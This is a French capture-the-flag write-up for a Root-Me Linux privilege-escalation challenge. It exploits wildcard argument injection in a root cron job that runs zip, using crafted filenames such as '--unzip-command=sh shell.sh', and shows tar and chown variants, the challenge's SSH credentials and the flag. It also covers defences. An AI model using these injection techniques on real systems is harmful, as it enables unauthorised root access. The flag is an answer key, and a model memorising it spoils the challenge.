# Linux Privesc - Argument Injection (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32245
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32245
```

---

## Objectif

Le système effectue des sauvegardes automatiques des fichiers utilisateur toutes les minutes. Exploiter ce mécanisme pour obtenir un accès root et lire `/root/flag.txt`.

---

## Reconnaissance

### Recherche du script de backup

```bash
user@challenge:~$ cat /usr/local/bin/backup.sh
#!/bin/bash
mkdir -p /root/backups
DATE=$(date +%Y%m%d_%H%M%S)
cd /home/user
zip -r /root/backups/backup_$DATE.zip *
cd /root/backups
ls -t | tail -n +6 | xargs -I {} rm -f {}
echo "Backup completed at $(date)"
```

### Vérification du cron job

```bash
user@challenge:~$ cat /etc/crontab
* * * * * root /usr/local/bin/backup.sh
```

### Analyse de la vulnérabilité

```
zip -r /root/backups/backup_$DATE.zip *
                                      │
                                      └── VULNÉRABILITÉ!
                                          Le wildcard * est interprété par le shell
                                          AVANT d'être passé à zip
```

**Problème :** L'utilisation du wildcard `*` dans un script exécuté en root permet l'injection d'arguments.

---

## Concept : Wildcard Injection

### Comment fonctionne l'injection

Quand le shell rencontre `*`, il l'expand en liste de fichiers :

```bash
# Si le répertoire contient:
file1.txt
file2.txt
-T
--unzip-command=sh shell.sh

# La commande:
zip -r backup.zip *

# Devient:
zip -r backup.zip file1.txt file2.txt -T --unzip-command=sh shell.sh
```

Les noms de fichiers commençant par `-` sont interprétés comme des options !

### Options zip exploitables

| Option | Description |
|--------|-------------|
| `-T` | Test the integrity of the archive (déclenche --unzip-command) |
| `--unzip-command=CMD` | Commande à exécuter pour tester l'archive |

---

## Exploitation

### Étape 1 : Créer le script malveillant

```bash
user@challenge:~$ echo "cat /root/flag.txt > /tmp/flag.out; chmod 777 /tmp/flag.out" > shell.sh
```

### Étape 2 : Créer les fichiers d'injection

```bash
# Créer le fichier -T (active le mode test de zip)
user@challenge:~$ touch -- "-T"

# Créer le fichier --unzip-command (exécute notre script)
user@challenge:~$ touch -- "--unzip-command=sh shell.sh"
```

**Note :** L'option `--` indique la fin des options, permettant de créer des fichiers commençant par `-`.

### Étape 3 : Vérifier les fichiers créés

```bash
user@challenge:~$ ls -la
total 32
-rw-r--r-- 1 user user    0 Feb 23 12:16 '--unzip-command=sh shell.sh'
-rw-r--r-- 1 user user    0 Feb 23 12:16  -T
drwxr-xr-x 1 user user 4096 Feb 23 12:16  .
drwxr-xr-x 1 root root 4096 Jul 13  2025  ..
-rw-r--r-- 1 user user   60 Feb 23 12:16  shell.sh
```

### Étape 4 : Attendre l'exécution du cron (max 1 minute)

```bash
# Attendre que le cron s'exécute...
user@challenge:~$ sleep 60
```

### Étape 5 : Lire le flag

```bash
user@challenge:~$ cat /tmp/flag.out
RM{e4a0cea6484ad12c2c49d6324fa7bc69}
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION INITIALE                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /usr/local/bin/backup.sh (exécuté par root toutes les min)│
│  ┌───────────────────────────────────────────────────────┐ │
│  │ cd /home/user                                         │ │
│  │ zip -r /root/backups/backup_$DATE.zip *               │ │
│  │                                       ↑               │ │
│  │                              Wildcard vulnérable      │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    PRÉPARATION EXPLOIT                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /home/user/                                                │
│  ├── shell.sh                (script malveillant)          │
│  │   └── cat /root/flag.txt > /tmp/flag.out                │
│  ├── -T                      (fichier = option zip)        │
│  └── --unzip-command=sh shell.sh  (fichier = option zip)   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    EXÉCUTION PAR CRON                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Le shell expand le wildcard:                               │
│                                                             │
│  zip -r backup.zip *                                        │
│         ↓                                                   │
│  zip -r backup.zip shell.sh -T --unzip-command=sh shell.sh  │
│                             │   │                           │
│                             │   └── Exécute: sh shell.sh    │
│                             └── Active le mode test         │
│                                                             │
│  Résultat: shell.sh s'exécute EN TANT QUE ROOT!            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    FLAG CAPTURÉ                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /tmp/flag.out contient:                                    │
│  RM{e4a0cea6484ad12c2c49d6324fa7bc69}                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{e4a0cea6484ad12c2c49d6324fa7bc69}
```

---

## Autres commandes vulnérables au wildcard injection

| Commande | Options exploitables | Exploitation |
|----------|---------------------|--------------|
| `tar` | `--checkpoint`, `--checkpoint-action` | Exécution de commande |
| `rsync` | `-e`, `--rsh` | Shell distant |
| `zip` | `-T`, `--unzip-command` | Exécution de commande |
| `7z` | `-o`, `-p` | Écriture arbitraire |
| `chown` | `--reference` | Changement de propriétaire |
| `chmod` | `--reference` | Changement de permissions |

### Exemple avec tar

```bash
# Fichiers à créer
echo "payload" > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# Quand tar est exécuté avec *:
tar cvf archive.tar *
# Devient: tar cvf archive.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
```

### Exemple avec chown

```bash
# Créer un fichier avec les permissions souhaitées
touch -- "--reference=/root/owned_file"

# Quand chown est exécuté avec *:
chown user:user *
# Change les permissions selon la référence
```

---

## Comment se protéger

### 1. Ne jamais utiliser de wildcards dans des scripts privilégiés

```bash
# MAUVAIS
cd /home/user
zip -r backup.zip *

# BON - Utiliser des chemins explicites
zip -r backup.zip /home/user/

# BON - Utiliser find avec -print0
find /home/user -type f -print0 | xargs -0 zip -r backup.zip
```

### 2. Préfixer avec ./

```bash
# Empêche l'interprétation des tirets comme options
for file in ./*; do
    process "$file"
done
```

### 3. Utiliser -- pour marquer la fin des options

```bash
# -- indique que tout ce qui suit n'est pas une option
zip -r backup.zip -- *
```

### 4. Quoter et valider les entrées

```bash
# Valider que les fichiers ne commencent pas par -
for file in *; do
    case "$file" in
        -*) echo "Fichier suspect: $file" ;;
        *) process "$file" ;;
    esac
done
```

---

## Commandes utiles

```bash
# Créer un fichier commençant par -
touch -- "-option"

# Lister les fichiers commençant par -
ls -- -* 2>/dev/null

# Supprimer un fichier commençant par -
rm -- "-fichier"

# Vérifier les cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron.*

# Trouver les scripts exécutés par cron
grep -r "*.sh" /etc/cron* 2>/dev/null

# Chercher les wildcards dans les scripts
grep -r '\*' /usr/local/bin/ 2>/dev/null
```

---

## Pourquoi ça fonctionne

Le shell POSIX effectue le "globbing" (expansion des wildcards) AVANT d'exécuter la commande :

```
1. Script contient: zip -r backup.zip *

2. Shell voit le wildcard et l'expand:
   - Lit le contenu du répertoire
   - Remplace * par la liste des fichiers

3. Commande finale exécutée:
   zip -r backup.zip file1 file2 -T --unzip-command=sh shell.sh

4. zip reçoit les arguments:
   - -r (option)
   - backup.zip (archive)
   - file1 (fichier à ajouter)
   - file2 (fichier à ajouter)
   - -T (OPTION! active le mode test)
   - --unzip-command=sh shell.sh (OPTION! commande à exécuter)
```

---

## Ressources

- [GTFOBins](https://gtfobins.github.io/)
- [Exploit DB - Unix Wildcards Gone Wild](https://www.exploit-db.com/papers/33930)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- `man bash` - Section "Pathname Expansion"
- `man zip` - Options de test
